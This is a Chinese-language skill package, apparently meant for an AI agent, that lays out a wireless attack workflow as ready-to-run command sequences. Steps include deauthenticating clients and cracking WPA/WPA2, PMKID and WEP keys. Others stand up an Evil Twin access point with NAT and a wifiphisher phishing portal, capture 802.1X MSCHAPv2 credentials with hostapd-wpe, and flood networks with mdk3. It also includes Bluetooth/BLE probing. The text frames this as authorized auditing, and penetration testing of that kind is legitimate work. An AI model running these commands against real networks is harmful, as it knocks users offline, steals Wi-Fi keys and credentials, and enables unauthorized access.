---
name: hfh-wireless-security
description: 网络安全知识库「无线安全」分类技能包，源自 Hi-FullHouse/CyberSecurity-Skills 上游 11-无线安全-WirelessSecurity。覆盖 Wi-Fi 无线安全审计全流程——网卡监听模式配置与无线信息收集（airmon-ng/airodump-ng/kismet/nmcli）、WPA/WPA2 握手包捕获与字典破解（aireplay-ng 去认证、aircrack-ng、hashcat hccapx）、PMKID 无客户端攻击、WEP IVs 收集与 ARP 重放、Evil Twin 伪造 AP 与 Captive Portal 钓鱼、WPA-Enterprise 802.1X 与 RADIUS 凭证捕获（hostapd-wpe、asleap）、无线 DoS（deauth/Beacon Flood/认证洪水）以及蓝牙与 BLE 安全测试（hcitool/sdptool/BlueBorne/gatttool/btlejack），含 2 份中文原文 references。
---

# 无线安全（Wireless Security）

本技能用于对**授权范围**内的无线网络做安全评估：先把网卡切到监听模式并完成周边 AP/客户端盘点，再按加密类型选择破解路径（WPA2 握手包 / PMKID / WEP / WPA3），必要时做 Evil Twin 与 802.1X 凭证捕获，最后覆盖蓝牙与 BLE 面。

判定顺序固定：**加密协议 → 认证方式（个人/企业）→ 是否启用 WPS → 客户端行为**。工具链以 Aircrack-ng 套件为主，配合 Kismet、Wifiphisher、Bettercap、hcxdumptool/hcxpcaptool、hostapd-wpe、Btlejack。所有操作需在合法授权的演练环境中进行，且需支持监听模式的无线网卡。

## 一、无线网络信息收集

```bash
# 接口状态
iwconfig
ifconfig wlan0
ip link show wlan0

# 启用监听模式
airmon-ng check kill
airmon-ng start wlan0
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# 扫描
airodump-ng wlan0mon
airodump-ng wlan0mon --band abg                        # 2.4G + 5G
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX wlan0mon    # 锁定信道与 BSSID

# 其它视角
nmcli dev wifi list
sudo iwlist wlan0 scan | grep -E "ESSID|Channel|Encryption|Quality"
airodump-ng -w scan --gpsd wlan0mon                    # GPS 打点（WiFi 定位）
kismet -c wlan0mon
```

## 二、WPA/WPA2 破解

### 1. 握手包捕获与字典破解

```bash
# 抓包
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w wpa_handshake wlan0mon

# 去认证逼客户端重连（发送 10 个 deauth 包）
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon   # 指定客户端

# 确认是否抓到握手：界面出现 "WPA handshake: XX:XX:XX:XX:XX:XX"
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b XX:XX:XX:XX:XX:XX wpa_handshake-01.cap

# GPU 加速：转 hccapx
cap2hccapx wpa_handshake-01.cap wpa_handshake.hccapx
hashcat -m 2500 -a 0 wpa_handshake.hccapx /usr/share/wordlists/rockyou.txt
```

### 2. PMKID 攻击（无需客户端）

较新 AP 会主动下发 PMKID，可直接抓取后离线破解。

```bash
hcxdumptool -o pmkid.pcapng -i wlan0mon --enable_status=1
hcxpcaptool -z pmkid.16800 pmkid.pcapng
hashcat -m 16800 -a 0 pmkid.16800 /usr/share/wordlists/rockyou.txt
```

### 3. WPA3

捕获 WPA3 握手后用 Dragonslayer：

```bash
python3 dragonslayer.py wlan0mon
```

## 三、WEP 破解

```bash
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w wep_crack wlan0mon
aireplay-ng -3 -b XX:XX:XX:XX:XX:XX wlan0mon      # ARP 重放加速 IVs 收集
# 收集到约 20,000–40,000 个 IVs 后：
aircrack-ng wep_crack-01.cap
aireplay-ng -4 -b XX:XX:XX:XX:XX:XX wlan0mon      # arpforge 伪造 ARP 包
```

## 四、Evil Twin 攻击

```bash
# 伪造 AP：airbase-ng
airbase-ng -a XX:XX:XX:XX:XX:XX --essid "TargetWiFi" -c 6 wlan0mon

# 或 hostapd（hostapd.conf）
# interface=wlan0
# driver=nl80211
# ssid=TargetWiFi
# hw_mode=g
# channel=6
# macaddr_acl=0
# auth_algs=1
# ignore_broadcast_ssid=0
hostapd hostapd.conf
```

完整流程：

```bash
# 1. 先把合法 AP 打下去
aireplay-ng -0 5 -a REAL_AP_BSSID wlan0mon

# 2. 启动伪造 AP
airbase-ng -a FAKE_BSSID --essid "TargetWiFi" -c 6 wlan0mon &
sleep 2

# 3. DHCP 与 NAT
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
cat > dnsmasq.conf << EOF
interface=at0
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
EOF
dnsmasq -C dnsmasq.conf
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 4. Captive Portal / SSLStrip 钓鱼页
wifiphisher
```

## 五、WPA-Enterprise（802.1X）攻击

```bash
# 伪造 RADIUS
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# 客户端连上伪造 AP 即捕获 MSCHAPv2 挑战-应答
asleap -r hostapd-wpe.log

# FreeRADIUS-WPE 可自动搭建 RADIUS 与 EAP 捕捉
```

EAP 攻击检测要点：① 能否获取匿名身份 ② 证书验证是否完整 ③ PEAP/MSCHAPv2 是否存在降级。

## 六、无线 DoS

```bash
aireplay-ng -0 0 -a XX:XX:XX:XX:XX:XX wlan0mon   # 持续 deauth
mdk3 wlan0mon d -c 6 -b XX:XX:XX:XX:XX:XX        # 批量 deauth
mdk3 wlan0mon b -c 6                             # Beacon Flood
mdk3 wlan0mon a -a XX:XX:XX:XX:XX:XX             # 认证洪水
# 干扰攻击需专用硬件（ESP8266/ESP32）或 RF 信号发生器
```

## 七、蓝牙与 BLE 安全测试

```bash
# 蓝牙侦察
hcitool scan
hcitool inq
hcitool name XX:XX:XX:XX:XX:XX
hcitool info XX:XX:XX:XX:XX:XX

# 服务发现
sdptool browse XX:XX:XX:XX:XX:XX
sdptool records XX:XX:XX:XX:XX:XX
sdptool search SP

# BlueBorne（CVE-2017-0781 等）
python3 blueborne-scanner.py

# BLE：gatttool
gatttool -b XX:XX:XX:XX:XX:XX -I
# [LE]> connect
# [LE]> primary
# [LE]> characteristics

# BLE：btlejack
btlejack -s -c 37-39
btlejack -f 0x123456789ABC -c 37-39

# BlueZ
bluetoothctl
# [bluetooth]# scan on
# [bluetooth]# devices
# [bluetooth]# pair XX:XX:XX:XX:XX:XX
# [bluetooth]# connect XX:XX:XX:XX:XX:XX
```

## 八、常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Aircrack-ng | 无线安全套件 | https://www.aircrack-ng.org/ |
| Kismet | 无线网络探测器 | https://www.kismetwireless.net/ |
| Reaver | WPS 破解 | https://github.com/t6x/reaver-wps-fork-t6x |
| Wifiphisher | 钓鱼框架 | https://github.com/wifiphisher/wifiphisher |
| Bettercap | 中间人攻击框架 | https://www.bettercap.org/ |
| HCXDumpTools | PMKID 捕获 | https://github.com/ZerBea/hcxdumptool |
| Btlejack | BLE 安全工具 | https://github.com/virtualabs/btlejack |
| hostapd-wpe | 企业 WPA 攻击 | https://github.com/OpenSecurityResearch/hostapd-wpe |

## 九、参考资源

- [Wireless Security Guide](https://owasp.org/www-community/controls/Testing_for_Wireless_Security)
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [HackTricks - Wireless](https://book.hacktricks.xyz/generic-methodologies-and-resources/wireless)
- [Bluetooth Security Research](https://github.com/IndrajeetPatil/Bluetooth-Security-Research)
- [Kali Linux Wireless Testing Guide](https://www.kali.org/docs/wireless/)
- [NIST SP 800-153 — Wireless Security Guidelines](https://csrc.nist.gov/publications/detail/sp/800-153/final)

## 十、上游原文（references/）

| 上游文件 | 本包路径 |
|:---|:---|
| `README.md`（分类导读：目标与技能清单） | `references/README.md` |
| `skills/WiFi安全审计-WiFiSecurityAudit.md` | `references/WiFi安全审计-WiFiSecurityAudit.md` |
